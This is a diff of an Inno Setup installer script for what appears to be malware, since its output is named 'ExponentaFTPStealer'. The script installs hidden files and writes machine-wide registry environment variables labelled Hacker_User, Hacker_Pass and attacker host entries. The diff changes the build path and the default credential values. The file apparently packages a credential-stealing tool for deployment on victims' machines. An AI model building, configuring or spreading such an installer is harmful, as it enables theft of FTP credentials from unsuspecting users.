@@ -16,7 +16,7 @@ SetupLogging=yes
 UsePreviousAppDir=yes
 DisableStartupPrompt=yes
 Output=yes
-OutputDir=d:\Download
+OutputDir=C:\CODE\Compile
 OutputBaseFilename=ExponentaFTPStealer
 RestartIfNeededByRun=False
 VersionInfoVersion=1.6.4.1
@@ -32,8 +32,8 @@ Source: "*.xml"; DestDir: "{app}\Util"; Attribs: hidden; Flags: recursesubdirs u
 
 [Registry]
 
-Root: HKLM; Subkey: "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"; Flags: deletevalue noerror uninsdeletevalue; ValueType: string; ValueName: "Hacker_User"; ValueData: "{%Hacker_User|MSSQLSR}"
-Root: HKLM; Subkey: "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"; Flags: deletevalue noerror uninsdeletevalue; ValueType: string; ValueName: "Hacker_Pass"; ValueData: "{%Hacker_Pass|Admin01234}"
+Root: HKLM; Subkey: "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"; Flags: deletevalue noerror uninsdeletevalue; ValueType: string; ValueName: "Hacker_User"; ValueData: "{%Hacker_User|MyAdminAccount}"
+Root: HKLM; Subkey: "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"; Flags: deletevalue noerror uninsdeletevalue; ValueType: string; ValueName: "Hacker_Pass"; ValueData: "{%Hacker_Pass|MyAdminPassword}"
 Root: HKLM; Subkey: "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"; Flags: deletevalue noerror uninsdeletevalue; ValueType: string; ValueName: "Hacker_host2"; ValueData: "{%Hacker_host2}"
 Root: HKLM; Subkey: "SYSTEM\CurrentControlSet\Control\Session Manager\Environment"; Flags: deletevalue noerror uninsdeletevalue; ValueType: string; ValueName: "Hacker_host3"; ValueData: "{%Hacker_host3}"
 
